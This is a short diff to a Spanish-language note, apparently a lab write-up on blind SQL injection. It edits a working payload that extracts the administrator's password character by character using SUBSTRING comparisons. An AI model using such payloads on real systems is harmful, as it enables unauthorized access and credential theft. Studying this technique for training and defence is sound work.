@@ -137,8 +137,8 @@ Para posición `i` probar caracteres `c` hasta encontrar el verdadero:
    * `' AND SUBSTRING((SELECT Password ...), i, 1) = 'c' -- `
    * o usar comparaciones `>` / `<` para acelerar (`> 'm'`, etc.).
 
-Ejemplo:
+Payload
 ```sql
-xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)='s
+' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='s
 ```
 
